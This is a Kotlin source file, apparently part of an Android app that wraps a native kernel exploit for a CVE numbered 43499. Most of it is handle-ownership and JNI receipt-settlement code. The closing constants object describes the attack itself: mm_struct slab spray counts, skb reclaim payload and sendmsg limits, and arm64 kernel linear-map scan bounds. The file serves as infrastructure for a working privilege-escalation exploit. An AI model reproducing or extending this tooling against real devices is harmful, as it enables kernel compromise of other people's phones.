package com.ghostlock.app.backend.cve43499.owned

import com.ghostlock.app.jni.Native43499CallResult
import com.ghostlock.app.jni.Native43499CloseResult
import com.ghostlock.app.jni.Native43499Jni

/**
 * 43499 线性 owner 的公共基类：private token + 单对象锁 + 生命周期状态机。
 *
 * 契约（见 `docs/plan/43499-resource-primitives-implementation-plan.md` §2/§3）：
 * - 每个 handle 只有一个 Kotlin owner；token 是 Native 对象地址，**永不公开**；
 * - 同一 owner 的所有调用以单对象锁串行（`guarded`）；
 * - close/转移前先在锁内原子取走 token 并置 0，再调用 JNI（三态结算）；
 * - 恢复 token 只在 JNI 明确返回「未接受」（[NativeCallState.NOT_ACCEPTED]）时发生；
 *   回执不完整（[NativeCallState.RECEIPT_INCOMPLETE]）一律 fail-stop，绝不恢复；
 * - 转移调用按 receipt 的 `consumed` 位决定是否恢复：consumed=1 不恢复；
 * - close 接受即消费，无论回执为 released 还是 retained；cancel 不消费；
 * - 不注册 `Cleaner`：dirty/retained 闭包由 Native 保留到进程退出，Kotlin 不猜测回收；
 * - `use {}` 只负责当前 owner；跨 owner 的转移由调用方按顺序显式处理。
 *
 * 阶段：G4L-5 Kotlin wrapper；本类不做任何 I/O、不读 profile、不推导 route。
 */
internal abstract class TokenOwner(
    /** owner 类别；只用于具名 reason 与日志，不参与安全边界。 */
    private val kind: OwnerKind,
) : AutoCloseable {
    /** Kotlin 视角的资源种类；与 Native 九入口一一对应。 */
    internal enum class OwnerKind { PLACEMENT, PAGE, ACTOR }

    /** owner 生命周期；所有迁移都在 [guarded] 内完成。 */
    internal enum class Lifecycle {
        /** 仍持有 token，可执行本资源的具名操作。 */
        OPEN,

        /** token 已按 receipt 转移给下一个 owner（本对象只读）。 */
        TRANSFERRED,

        /** close 已被接受并消费 token（无论 released 还是 retained）。 */
        CLOSED,
    }

    /** 单对象锁；所有状态读写都必须经过 [guarded]。 */
    private val monitor = Any()

    /** Native 资源 token；0 表示当前不持有（已转移或已消费）。 */
    private var token: Long = 0L

    private var lifecycle: Lifecycle = Lifecycle.OPEN

    /**
     * 在单对象锁内执行一段 owner 事务。
     *
     * @param block 事务体；只允许访问本对象的受保护状态。
     * @return 事务体返回值。
     * @note 前提：调用方不持有 JNI 全局锁、不在其它 owner 的锁内重入本 owner。
     * @note 阶段：所有公开/内部方法的第一层包装。
     */
    internal fun <R> guarded(block: () -> R): R = synchronized(monitor, block)

    /** @return 锁内可见的 token；0 表示不持有。只在 [guarded] 内调用。 */
    internal fun tokenLocked(): Long = token

    /** @return 锁内可见的生命周期。只在 [guarded] 内调用。 */
    internal fun lifecycleLocked(): Lifecycle = lifecycle

    /**
     * 原子取走 token 并置 0；供 close/转移调用使用。
     *
     * @return 取到的 token；0 表示当前不持有。
     * @note 只在 [guarded] 内调用；取出后必须按 receipt 决定恢复或消费。
     */
    internal fun takeTokenLocked(): Long {
        val taken = token
        token = 0L
        return taken
    }

    /**
     * 恢复一个「Native 未接受」调用的 token。
     *
     * @param value 之前 [takeTokenLocked] 取到的值。
     * @return true 恢复成功；false 表示 token 已被消费（不可恢复，调用方按 dirty 处理）。
     * @note 只在 [guarded] 内调用；仅在输出 ABI 未被 Native 写回时使用。
     */
    internal fun restoreTokenLocked(value: Long): Boolean {
        if (token != 0L) return false
        token = value
        return true
    }

    /**
     * 安装一个刚由 Native 产出的 token（仅用于新建 owner）。
     *
     * @param value 非零 token。
     * @return true 安装成功；false 表示本对象已持有 token 或已非 OPEN（不覆盖）。
     * @note 只在 [guarded] 内或对象构造后的单线程初始化阶段调用。
     */
    internal fun adoptToken(value: Long): Boolean = guarded {
        if (lifecycle != Lifecycle.OPEN || token != 0L || value == 0L) {
            false
        } else {
            token = value
            true
        }
    }

    /** 标记 token 已转移给下一个 owner；只在 [guarded] 内调用。 */
    internal fun markTransferredLocked() {
        lifecycle = Lifecycle.TRANSFERRED
    }

    /** 标记 close 已接受；只在 [guarded] 内调用。 */
    internal fun markClosedLocked() {
        lifecycle = Lifecycle.CLOSED
    }

    /** @return 是否仍持有可操作的 token（锁内判定）。 */
    internal fun isOpen(): Boolean = guarded { lifecycle == Lifecycle.OPEN && token != 0L }

    /** @return 具名 owner 描述；不暴露 token。 */
    internal fun describe(): String = "$kind/${lifecycle.name}"

    /**
     * `use {}` 只负责当前 owner：委托给 [closeDetailed] 并丢弃回执。
     *
     * @note 已转移/已关闭的 owner 调用本方法是无副作用的拒绝（不触 Native）。
     * @note 不使用 Cleaner：retained 闭包由 Native 保留到进程退出。
     */
    final override fun close() {
        closeDetailed()
    }

    /**
     * 终结本 owner；实现必须在 [guarded] 内完成 token 取走、JNI 调用与状态迁移。
     *
     * @return 具名结局；[OwnerCloseOutcome.Released]/[OwnerCloseOutcome.Retained]
     *         表示 Native 已接受并消费 token。
     */
    internal abstract fun closeDetailed(): OwnerCloseOutcome

    companion object {
        /**
         * 封装一次 close JNI 调用并完成 token 结算（模板方法，供三个实现复用）。
         *
         * @param owner 目标 owner（调用方必须已在 [guarded] 内）。
         * @param call 实际的 close JNI 调用；参数为该 owner 的 token。
         * @return 具名结局；未接受时 token 已恢复、生命周期不变。
         * @note 前提：调用方已确认生命周期为 OPEN 且 token 非零。
         */
        internal fun settleClose(
            owner: TokenOwner,
            call: (Long, Native43499CloseResult) -> Int,
        ): OwnerCloseOutcome {
            val taken = owner.takeTokenLocked()
            val receipt = Native43499CloseResult()
            val jniStatus = call(taken, receipt)
            when (classifyIntStatus(jniStatus)) {
                NativeCallState.NOT_ACCEPTED -> {
                    /* JNI 未调用 core：token 未被消费，必须恢复。 */
                    if (!owner.restoreTokenLocked(taken)) {
                        owner.markClosedLocked()
                        return OwnerCloseOutcome.Rejected(
                            "close-not-accepted-token-lost",
                        )
                    }
                    return OwnerCloseOutcome.NotAccepted
                }
                NativeCallState.RECEIPT_INCOMPLETE -> {
                    owner.markClosedLocked()
                    return OwnerCloseOutcome.ReceiptIncomplete()
                }
                NativeCallState.ACCEPTED -> Unit
            }
            owner.markClosedLocked()
            val released = receipt.ownedChainReleased && !receipt.retainedForProcessExit
            return if (released) {
                OwnerCloseOutcome.Released(receipt)
            } else {
                OwnerCloseOutcome.Retained(receipt)
            }
        }

        /**
         * 封装一次 cancel JNI 调用并完成 token 结算（cancel 不消费 token）。
         *
         * @param owner 目标 owner（调用方必须已在 [guarded] 内）。
         * @param call 实际的 cancel JNI 调用；参数为该 owner 的 token。
         * @return 具名结局；未接受时状态不变（token 从未离开 owner）。
         * @note 前提：调用方已确认生命周期为 OPEN 且 token 非零。
         */
        internal fun settleCancel(
            owner: TokenOwner,
            call: (Long, Native43499CloseResult) -> Int,
        ): OwnerCancelOutcome {
            val receipt = Native43499CloseResult()
            val jniStatus = call(owner.tokenLocked(), receipt)
            return when (classifyIntStatus(jniStatus)) {
                NativeCallState.NOT_ACCEPTED -> OwnerCancelOutcome.NotAccepted
                NativeCallState.RECEIPT_INCOMPLETE ->
                    OwnerCancelOutcome.ReceiptIncomplete()
                NativeCallState.ACCEPTED -> OwnerCancelOutcome.Cancelled(receipt)
            }
        }
    }
}

/**
 * JNI 调用的三态结算判据（F-C）。
 *
 * - [ACCEPTED]：JNI 正常返回；按 receipt 结算（consumed=1 不恢复，clean=0 恢复）。
 * - [NOT_ACCEPTED]：JNI 前置拒绝，**未调用 core**、未写回执；token 未被消费 ⇒ 恢复。
 * - [RECEIPT_INCOMPLETE]：JNI 已调用 core 但回执写不全；**fail-stop**：不恢复 token、
 *   不重试、不 close，也不信任回执内容（consumed/retained 未知）。
 *
 * @note `Int.MIN_VALUE` 不再作为唯一的恢复判据；恢复必须由 JNI 明确「未接受」触发。
 */
internal enum class NativeCallState { ACCEPTED, NOT_ACCEPTED, RECEIPT_INCOMPLETE }

/**
 * 把 handle 入口返回值映射为三态。
 *
 * @param value JNI 返回的 handle（0 仍表示正常的无效 handle）。
 * @return 三态结算判据。
 */
internal fun classifyHandleStatus(value: Long): NativeCallState = when (value) {
    Native43499Jni.RESULT_NOT_ACCEPTED_HANDLE -> NativeCallState.NOT_ACCEPTED
    Native43499Jni.RESULT_INCOMPLETE_HANDLE -> NativeCallState.RECEIPT_INCOMPLETE
    else -> NativeCallState.ACCEPTED
}

/**
 * 把 int 入口返回值映射为三态。
 *
 * @param value JNI 返回的 core 状态或哨兵。
 * @return 三态结算判据。
 */
internal fun classifyIntStatus(value: Int): NativeCallState = when (value) {
    Native43499Jni.RESULT_NOT_ACCEPTED_INT -> NativeCallState.NOT_ACCEPTED
    Native43499Jni.RESULT_INCOMPLETE_INT -> NativeCallState.RECEIPT_INCOMPLETE
    else -> NativeCallState.ACCEPTED
}

/** close 的具名结局；Released/Retained 都表示 token 已被消费。 */
internal sealed interface OwnerCloseOutcome {
    /** Native 干净释放了完整所有权链；token 已消费。 */
    data class Released(val receipt: Native43499CloseResult) : OwnerCloseOutcome

    /** Native 保留了无法安全释放的闭包（进程退出才回收）；token 已消费。 */
    data class Retained(
        val receipt: Native43499CloseResult,
        val reason: String = "close-retained-for-process-exit",
    ) : OwnerCloseOutcome

    /** 输出 ABI 未写回：入口未接受，token 已恢复、生命周期不变。 */
    data object NotAccepted : OwnerCloseOutcome

    /** JNI 已调用 core 但回执不完整：token 视为已消耗，fail-stop（不恢复/不重试/不 close）。 */
    data class ReceiptIncomplete(
        val reason: String = "close-receipt-incomplete",
    ) : OwnerCloseOutcome

    /** wrapper 本地拒绝（已转移/已关闭/无 token）；未触 Native。 */
    data class Rejected(val reason: String) : OwnerCloseOutcome
}

/** cancel 的具名结局；cancel 不消费 token。 */
internal sealed interface OwnerCancelOutcome {
    /** Native 接受了停止请求；token 仍在 owner 手里。 */
    data class Cancelled(val receipt: Native43499CloseResult) : OwnerCancelOutcome

    /** 输出 ABI 未写回：入口未接受，状态不变。 */
    data object NotAccepted : OwnerCancelOutcome

    /** JNI 已调用 core 但回执不完整：fail-stop，token 状态未知（cancel 不消费 token）。 */
    data class ReceiptIncomplete(
        val reason: String = "cancel-receipt-incomplete",
    ) : OwnerCancelOutcome

    /** wrapper 本地拒绝（已转移/已关闭/无 token）；未触 Native。 */
    data class Rejected(val reason: String) : OwnerCancelOutcome
}

/**
 * 43499 物理常量（Kotlin 侧唯一副本）。
 *
 * @note 与 Native `app/src/main/cpp/gl43499/core/kernel_internal.h` 的具名常量一一对应；
 *       Native 不读 profile，Kotlin 必须显式传入这些值。改 Native 常量必须同批改这里。
 * @note 阶段：G4L-5；只读常量，不含运行期状态。
 */
internal object Cve43499PhysicalConstants {
    /** Native `GLK43499_PHYS_PAGE_SIZE`：页大小 / 候选页基址布局边界。 */
    const val PAGE_SIZE_BYTES: Long = 0x1000L

    /** Native `GLK43499_PHYS_ALLOCATION_SIZE`：mm_struct slab 分配大小（order-3）。 */
    const val ALLOCATION_SIZE_BYTES: Long = 0x8000L

    /** Native `GLK43499_PHYS_OBJECTS_PER_SLAB`：每 slab 的 mm_struct 数。 */
    const val OBJECTS_PER_SLAB: Int = 25

    /** Native `GLK43499_PHYS_PREPARE_SLABS * OBJECTS_PER_SLAB`。 */
    const val PREPARE_OBJECT_COUNT: Int = 8 * OBJECTS_PER_SLAB

    /** Native `(1 + GLK43499_PHYS_MM_PARTIALS) * OBJECTS_PER_SLAB`。 */
    const val SPRAY_OBJECT_COUNT: Int = 6 * OBJECTS_PER_SLAB

    /** Native `GLK43499_PHYS_OBJECTS_PER_SLAB - 1`。 */
    const val PRE_OBJECT_COUNT: Int = OBJECTS_PER_SLAB - 1

    /** Native `GLK43499_PHYS_OBJECTS_PER_SLAB`。 */
    const val POST_OBJECT_COUNT: Int = OBJECTS_PER_SLAB

    /** Native `GLK43499_PHYS_SKB_SEND_SIZE`：landing 最终字节长度。 */
    const val RECLAIM_PAYLOAD_SIZE_BYTES: Long = 0x10000L

    /** landing 的 reclaim `sendmsg` 次数上限（Native 物理上限 16）。 */
    const val RECLAIM_SEND_LIMIT: Long = 4L

    /** landing 的 socket 发送缓冲（旧物理实现固定 1 MiB）。 */
    const val RECLAIM_SOCKET_SEND_BUFFER_BYTES: Long = 1L shl 20

    /** Native `GLK43499_PHYS_IDENTITY_START`（arm64 VA_BITS=39）的无符号值。 */
    val SCAN_LOWER_BOUND_UNSIGNED: ULong = 0xffffff8000000000uL

    /** Native `GLK43499_PHYS_IDENTITY_END`（起始 + 64 GiB）的无符号值。 */
    val SCAN_UPPER_BOUND_UNSIGNED: ULong = 0xffffffc000000000uL

    /** 默认扫描步长：页大小；必须整除 `ALLOCATION_SIZE_BYTES`。 */
    const val SCAN_STEP_BYTES: Long = PAGE_SIZE_BYTES

    /** 默认测量重试轮数上限（Native 物理上限 8）。 */
    const val SCAN_ROUND_LIMIT: Long = 3L
}

/** Native `glk43499_call_status` 的具名常量（与 `core/result.h` 对齐）。 */
internal object Native43499CallStatus {
    const val OK: Int = 0
    const val INVALID_ARGUMENT: Int = 1
    const val BAD_ABI: Int = 2
    const val STALE_HANDLE: Int = 3
    const val WRONG_HANDLE_KIND: Int = 4
    const val BUSY: Int = 5
    const val TIMEOUT: Int = 6
    const val CANCELLED: Int = 7
    const val SYSTEM_ERROR: Int = 8
    const val UNSUPPORTED: Int = 9
    const val INTERNAL_ERROR: Int = 10

    /** @param value 回执里的原始状态。 @return 稳定可检索的具名文本。 */
    fun name(value: Int): String = when (value) {
        OK -> "ok"
        INVALID_ARGUMENT -> "invalid-argument"
        BAD_ABI -> "bad-abi"
        STALE_HANDLE -> "stale-handle"
        WRONG_HANDLE_KIND -> "wrong-handle-kind"
        BUSY -> "busy"
        TIMEOUT -> "timeout"
        CANCELLED -> "cancelled"
        SYSTEM_ERROR -> "system-error"
        UNSUPPORTED -> "unsupported"
        INTERNAL_ERROR -> "internal-error"
        else -> "unknown-status"
    }
}

/** Native `glk43499_effect` 的具名常量（与 `core/result.h` 对齐）。 */
internal object Native43499Effect {
    const val NONE: Int = 0
    const val NOT_APPLIED: Int = 1
    const val CLEAN_SUCCESS: Int = 2
    const val CLEAN_FAILURE: Int = 3
    const val INDETERMINATE: Int = 4
    const val DIRTY: Int = 5

    /** @param value 回执里的原始效果。 @return 稳定可检索的具名文本。 */
    fun name(value: Int): String = when (value) {
        NONE -> "none"
        NOT_APPLIED -> "not-applied"
        CLEAN_SUCCESS -> "clean-success"
        CLEAN_FAILURE -> "clean-failure"
        INDETERMINATE -> "indeterminate"
        DIRTY -> "dirty"
        else -> "unknown-effect"
    }
}

/**
 * 把回执压缩成具名 reason，供 Refused/Failed 分支使用（不含业务成功主张）。
 *
 * @param stage 入口名（例如 `landPage`）。
 * @return 形如 `landPage:timeout/dirty` 的可检索文本。
 */
internal fun Native43499CallResult.reason(stage: String): String =
    stage + ":" + Native43499CallStatus.name(callStatus) + "/" + Native43499Effect.name(effect)
